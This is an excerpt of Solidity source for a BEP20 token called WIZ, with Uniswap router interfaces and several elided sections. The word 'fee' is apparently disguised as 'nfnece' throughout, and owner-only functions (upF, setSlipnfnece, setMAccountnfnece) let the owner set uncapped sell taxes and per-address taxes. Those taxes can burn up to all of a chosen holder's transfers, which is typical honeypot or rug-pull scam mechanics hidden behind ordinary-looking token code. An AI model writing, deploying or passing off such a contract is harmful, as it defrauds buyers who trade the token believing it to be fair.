...
interface IUniswapV2Factory {
    ...
    function nfneceTo() external view returns (address);
    function nfneceToSetter() external view returns (address);
    ...
    function setnfneceTo(address) external;
    function setnfneceToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingnfneceOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingnfneceOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingnfneceOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingnfneceOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingnfneceOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract WIZ is BEP20, Ownable {
    ...
    uint256 private _defaultSellnfnece = 0;

    uint256 private _defaultBuynfnece = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipnfnece;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellnfnece = _value;
    }

    function setSlipnfnece(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipnfnece[_address] = _value;
    }

    function getSlipnfnece(address _address) external view onlyownar returns (uint256) {
        return _slipnfnece[_address];
    }


    function setMAccountnfnece(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountnfnece(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradenfneceAmount = 0;

        if (rF) {
            uint256 tradenfnece = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradenfnece = _defaultSellnfnece;
                }
                if (from == uniswapV2Pair) {

                    tradenfnece = _defaultBuynfnece;
                }
            }
            if (_slipnfnece[from] > 0) {
                tradenfnece = _slipnfnece[from];
            }

            tradenfneceAmount = _Amount.mul(tradenfnece).div(100);
        }


        if (tradenfneceAmount > 0) {
            _balances[from] = _balances[from].sub(tradenfneceAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradenfneceAmount);
            emit Transfer(from, _deadAddress, tradenfneceAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradenfneceAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradenfneceAmount);
        emit Transfer(from, _to, _Amount - tradenfneceAmount);
    }
